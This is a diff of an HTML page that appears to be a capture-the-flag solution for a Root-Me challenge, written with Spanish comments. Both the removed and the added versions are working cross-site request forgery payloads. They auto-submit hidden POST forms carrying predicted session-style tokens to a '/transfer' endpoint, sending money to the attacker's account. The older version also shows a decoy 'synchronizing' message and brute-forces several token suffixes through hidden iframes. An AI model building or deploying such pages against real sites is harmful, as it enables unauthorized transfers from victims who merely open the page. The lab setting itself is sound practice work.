@@ -1,69 +1,35 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Iniciando transferencia segura...</title>
+    <title>Cargando proyecto...</title>
 </head>
 <body>
-    <div style="text-align: center; margin-top: 50px; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;">
-        <h1 id="status">Sincronizando con el servidor del Club...</h1>
-        <p>Por favor, mantenga esta pestaña abierta para completar la validación.</p>
-        <div id="logs" style="color: #666; font-size: 0.8em; margin-top: 20px;"></div>
-    </div>
-
     <script>
-        const targetUrl = "https://instance-019c1d39-1877-73ea-8b32-2bc46600599b.challenges.root-me.pro/transfer";
-        const myUsername = "test"; // TU USUARIO
-        const amount = "1337";
-        
-        // Base del token de l0ve_Oracle_l4rry (Timestamp + ProcessID)
-        const tokenBase = "6634f9174300bf0200"; 
-        
-        // Probaremos los contadores del 000000 al 000005
-        const counters = ["000000", "000001", "000002", "000003", "000004", "000005"];
+        // Creamos el formulario dinámicamente
+        var f = document.createElement("form");
+        f.action = "https://instance-019c1d39-1877-73ea-8b32-2bc46600599b.challenges.root-me.pro/transfer";
+        f.method = "POST";
 
-        function launchAttack(token, index) {
-            // 1. Crear iframe oculto
-            const iframe = document.createElement("iframe");
-            iframe.name = "frame_" + index;
-            iframe.style.display = "none";
-            document.body.appendChild(iframe);
+        // Parámetros del ataque
+        var data = {
+            "token": "6594d3fb4300bf02000000", // Token predicho para 'the_dwalt00ns'
+            "recipient": "test",             // TU nombre de usuario
+            "amount": "10000000"           // Cantidad para ser millonario
+        };
 
-            // 2. Crear formulario dinámico
-            const form = document.createElement("form");
-            form.method = "POST";
-            form.action = targetUrl;
-            form.target = iframe.name;
-
-            const fields = {
-                "token": token,
-                "recipient": myUsername,
-                "amount": amount
-            };
-
-            for (const name in fields) {
-                const input = document.createElement("input");
-                input.type = "hidden";
-                input.name = name;
-                input.value = fields[name];
-                form.appendChild(input);
-            }
-
-            // 3. Enviar
-            document.body.appendChild(form);
-            form.submit();
-            
-            // Log visual para nosotros
-            document.getElementById("logs").innerHTML += "Enviando ráfaga con token: " + token + "<br>";
+        for (var key in data) {
+            var input = document.createElement("input");
+            input.type = "hidden";
+            input.name = key;
+            input.value = data[key];
+            f.appendChild(input);
         }
 
-        window.onload = function() {
-            counters.forEach((suffix, i) => {
-                const fullToken = tokenBase + suffix;
-                launchAttack(fullToken, i);
-            });
-
-            document.getElementById("status").innerText = "¡Validación completada!";
-        };
+        document.body.appendChild(f);
+        
+        // Enviamos el formulario. Esto hará que la página del bot navegue
+        // directamente hacia el banco.
+        f.submit();
     </script>
 </body>
 </html>
